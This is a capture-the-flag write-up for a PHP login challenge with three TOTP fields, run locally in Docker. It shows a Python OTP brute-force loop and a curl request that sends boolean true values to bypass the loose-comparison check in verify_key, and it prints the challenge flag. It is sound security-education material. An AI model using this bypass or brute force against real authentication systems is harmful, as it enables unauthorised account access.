

---

## Understanding the Repo.

docker: 
* base :php:8.1.12-apache-bullseye
* service: otp
* port 8901:80


Flag's given in the dockerfile? `hkcert22{mistakes-off-the-page}`

---

Ask Grok AI A brief explanation of the php files as I have no experience with php.

1. `index.php:`
Presents a login form with fields for username, password, and three OTP fields (otp1, otp2, otp3).  Submits a JSON POST request to /login.php with the form data. Displays success or error messages based on the server’s response.

2. login.php:
Handles login requests via JSON input ($_DATA).  Contains a hardcoded user database ($USER_DB) with one user: Username: admin Password hash: password_hash("admin", PASSWORD_DEFAULT) Three TOTP secret keys: key1, key2, key3 (generated dynamically using Google2FA::generate_secret_key()).  Validates: Username existence.  Password using password_verify.  Three OTPs using Google2FA::verify_key.  Returns the flag (from $_ENV['FLAG'] or a fake flag) if all checks pass.

3. google2fa.php:
Implements TOTP authentication based on the Google Authenticator algorithm.  Key functions: generate_secret_key: Creates a 16-character Base32 secret key.  get_timestamp: Returns the current Unix timestamp divided by 30 (TOTP interval).  base32_decode: Decodes a Base32 string to binary.  oath_hotp: Generates a 6-digit OTP from a binary key and timestamp.  verify_key: Checks if a provided OTP matches the expected OTP for a secret key, allowing a window of ±4 time steps.  oath_truncate: Extracts a 6-digit OTP from an HMAC-SHA1 hash.

4. jsonhandler.php:
Utility functions to parse JSON input and send JSON responses with error or success messages.  main.css: Styles the login form for a clean, centered UI.

---- 


## Trying Solutions

1. First start with common file paths for CTF. 
```
http://localhost:8901/flag
http://localhost:8901/flag.txt
http://localhost:8901/env
http://localhost:8901/info.php
http://localhost:8901/.env
```
Found no vulnerability. Either get 404 or 403.

2. Try the known credentials with arbitrary OTPs:
```
curl -X POST http://localhost:8901/login.php -H "Content-Type: application/json" -d '{"username":"admin","password":"admin","otp1":"000000","otp2":"000000","otp3":"000000"}'
```

Response: {"error":{"code":500,"message":"wrong otp1","data":"otp1"}}%  

3. Try different combinations of OTP including:
* empty OTP, omit OTP (just username and login), `null` as OTP

4. Maybe Brute Force OTP? But Most likely impossible since the keys seem to regenerate per request.

```python3
import requests
import json

url = "http://localhost:8901/login.php"
headers = {"Content-Type": "application/json"}
payload = {
    "username": "admin",
    "password": "admin",
    "otp1": "000000",
    "otp2": "000000",
    "otp3": "000000"
}

# Test a range of OTPs (e.g., 000000 to 999999)
for i in range(1000000):
    otp = f"{i:06d}"  # Pad to 6 digits
    payload["otp1"] = otp
    payload["otp2"] = otp
    payload["otp3"] = otp
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    if "Congrats" in response.text:
        print("Success:", response.text)
        break
    else:
        print(f"Tried OTP {otp}: {response.text}")
```

5. Try Input Manipulation. (The json_decode function or Google2FA::verify_key might mishandle unexpected input types)

6. Check docker compose log for misconfiguration that can expose environmental variable (FLAG). 

7. Input Manipulation again with Booleans. 

** The issue seems to lie in the function `verify_key`

``` php
public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {
    $timeStamp = self::get_timestamp();
    if ($useTimeStamp !== true) $timeStamp = (int)$useTimeStamp;
    $binarySeed = self::base32_decode($b32seed);

    for ($ts = $timeStamp - $window; $ts <= $timeStamp + $window; $ts++)
        if (self::oath_hotp($binarySeed, $ts) == $key)   // Loose Comparison
            return true;
    return false;
}
```

Issue: 
```php
// in php language
"123456" == true   // → true
// should use === to disable type juggling ? 
```


## Exploit / Solution
```
curl -X POST http://localhost:8901/login.php -H "Content-Type: application/json" -d '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}' > response.txt && cat response.txt
```
